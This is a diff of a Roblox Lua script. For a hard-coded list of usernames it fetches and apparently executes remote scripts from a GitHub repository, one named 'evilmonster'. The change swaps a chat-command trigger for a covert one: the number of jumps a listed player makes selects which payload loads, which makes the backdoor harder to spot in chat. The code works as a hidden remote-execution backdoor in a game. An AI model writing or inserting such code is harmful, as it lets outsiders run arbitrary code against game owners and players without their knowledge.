@@ -1,5 +1,4 @@
 local Players = game:GetService("Players")
-local TextChatService = game:GetService("TextChatService")
 
 local allowed = {
 	["project_2kit"] = true,
@@ -7,7 +6,7 @@ local allowed = {
 	["sharksinthewater"] = true,
 	["theonerulerofgravity"] = true,
 	["koolguy1234513"] = true, 
-    ["Animatedupload"] = true
+	["animatedupload"] = true
 }
 
 local function safeLoad(url)
@@ -18,40 +17,83 @@ local function safeLoad(url)
 	end
 end
 
-local function runCommand(msg)
-	if typeof(msg) ~= "string" then
-		return
-	end
-	local m = string.lower(msg)
-	if string.find(m, "shy", 1, true) then
+local function runCommand(count)
+	if count == 1 then
 		safeLoad("https://raw.githubusercontent.com/Breadcrumbzes/Hey/main/shy%20guy")
-	elseif string.find(m, "san", 1, true) then
+	elseif count == 2 then
 		safeLoad("https://raw.githubusercontent.com/Breadcrumbzes/Hey/main/sand")
-	elseif string.find(m, "test", 1, true) then
+	elseif count == 3 then
 		safeLoad("https://raw.githubusercontent.com/Breadcrumbzes/Hey/main/Test")
-	elseif string.find(m, "ohno", 1, true) then
+	elseif count == 4 then
 		safeLoad("https://raw.githubusercontent.com/Breadcrumbzes/Hey/main/evilmonster")
 	end
 end
 
-if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-	TextChatService.MessageReceived:Connect(function(message)
-		if not message.TextSource then
-			return
-		end
-		local player = Players:GetPlayerByUserId(message.TextSource.UserId)
-		if player and allowed[string.lower(player.Name)] then
-			runCommand(message.Text)
+local function setupCharacter(plr, char)
+	local humanoid = char:WaitForChild("Humanoid")
+
+	local jumpCount = 0
+	local timer = 0
+	local running = false
+
+	local function startTimer()
+		if running then return end
+		running = true
+
+		task.spawn(function()
+			while timer > 0 do
+				task.wait(1)
+				timer -= 1
+			end
+
+			-- Timer ended
+			if jumpCount >= 1 and jumpCount <= 4 then
+				runCommand(jumpCount)
+			end
+
+			-- Reset everything
+			jumpCount = 0
+			timer = 0
+			running = false
+		end)
+	end
+
+	humanoid.StateChanged:Connect(function(_, newState)
+		if newState == Enum.HumanoidStateType.Jumping then
+			jumpCount += 1
+
+			-- If above 4 → reset instantly
+			if jumpCount > 4 then
+				jumpCount = 0
+				timer = 0
+				running = false
+				return
+			end
+
+			timer += 3
+			startTimer()
 		end
 	end)
-else
-	local function hookPlayer(plr)
-		if allowed[string.lower(plr.Name)] then
-			plr.Chatted:Connect(runCommand)
-		end
-	end
-	for _, plr in ipairs(Players:GetPlayers()) do
-		hookPlayer(plr)
-	end
-	Players.PlayerAdded:Connect(hookPlayer)
 end
+
+local function hookPlayer(plr)
+	if not allowed[string.lower(plr.Name)] then
+		return
+	end
+
+	plr.CharacterAdded:Connect(function(char)
+		setupCharacter(plr, char)
+	end)
+
+	if plr.Character then
+		setupCharacter(plr, plr.Character)
+	end
+end
+
+-- Hook existing players
+for _, plr in ipairs(Players:GetPlayers()) do
+	hookPlayer(plr)
+end
+
+-- Hook new players
+Players.PlayerAdded:Connect(hookPlayer)
